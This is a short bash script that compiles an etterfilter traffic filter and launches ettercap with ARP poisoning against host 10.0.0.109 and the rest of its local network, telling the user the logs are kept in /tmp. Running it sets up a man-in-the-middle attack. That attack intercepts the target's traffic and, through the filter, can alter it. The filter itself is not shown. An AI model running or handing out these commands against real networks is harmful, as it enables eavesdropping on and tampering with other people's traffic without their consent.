#!/bin/bash
sudo etterfilter ip.filter -o ip.ef
sudo ettercap -Tq -F ip.ef -M arp:remote /10.0.0.109/ //
echo "Log files are located in /tmp directory"
